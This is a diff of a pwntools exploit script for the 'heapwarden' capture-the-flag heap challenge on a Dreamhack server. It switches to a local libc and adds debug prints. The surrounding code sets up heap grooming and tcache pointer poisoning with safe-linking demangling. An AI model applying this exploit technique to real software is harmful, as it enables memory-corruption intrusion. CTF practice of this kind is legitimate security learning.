@@ -2,7 +2,7 @@
 from pwn import *
 
 exe  = context.binary = ELF(args.EXE or './heapwarden')
-libc = ELF(exe.libc.path) if exe.libc else None
+libc = ELF('./libc.so.6')
 
 def make(size, data=b'', initialize=False):
     io.sendlineafter(b'> ', b'1')
@@ -44,10 +44,11 @@ def demangle(val):
 io = remote('host3.dreamhack.games', 8689)
 
 mapping = {}
-for i in range(0x140-5): make(0x100, f'heap_{i}'.encode(), True)
+for i in range(0x140-5): print(i) ; make(0x100, f'heap_{i}'.encode(), True)
 
 free(0)
 for i in range(1, 0x140-5):  
+  print(i)
   data = show(i)
   if b'heap' not in data: 
     mapping[0] = i
@@ -56,6 +57,7 @@ for i in range(1, 0x140-5):
 
 free(1)
 for i in range(2, 0x140-5):
+  print(i)
   if b'heap' not in show(i) and i != mapping[0]: mapping[1] = i ; break
 
 edit(mapping[1], data=p64((heap_base+0x10)^((heap_base+0x4a0+(0x110*mapping[1]))>>12)))
